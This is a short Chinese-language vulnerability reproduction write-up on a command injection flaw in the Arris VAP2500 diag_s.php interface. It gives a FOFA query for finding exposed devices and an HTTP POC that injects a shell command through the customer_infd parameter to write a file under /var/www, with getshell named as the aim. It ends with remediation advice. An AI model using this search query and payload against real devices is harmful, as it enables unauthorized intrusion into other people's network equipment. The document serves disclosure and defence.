# 漏洞复现 | Arris VAP2500 diag_s 存在命令注入漏洞

## 漏洞信息

| 属性 | 值 |
|------|-----|
| 漏洞名称 | Arris VAP2500 diag_s 命令注入漏洞 |
| 漏洞类型 | 命令注入 |
| 组件 | Arris VAP2500 |
| 严重程度 | 高危 |

## 漏洞概述

Arris VAP2500 设备diag_s接口存在命令注入漏洞，攻击者可通过在`customer_infd`参数中构造恶意命令，将内容写入任意文件，进而可getshell。

## FOFA查询语法

```ini
app="ARRIS-VAP2500"
```

或者基于关键字搜索：
```ini
title="VAP2500" || header="VAP2500"
```

## 漏洞复现

### POC

**写入命令**
```http
POST /diag_s.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

action=1&customer_infd=;echo test >/var/www/shell.txt;
```

**访问文件**
```http
GET /shell.txt HTTP/1.1
```

### 特征

- 路径：`/diag_s.php`
- 参数：`action=1`, `customer_infd`
- 利用：`;echo ... >/var/www/...`
- 访问：直接GET文件路径

## 修复建议

1. 对用户输入进行严格过滤
2. 禁用系统命令执行功能
3. 更新设备固件到最新版本
4. 限制管理接口访问

---

*来源：实战安全研究 | 原文链接：https://mp.weixin.qq.com/s/vxQUAcVosXJ4ueFDhT_uAg*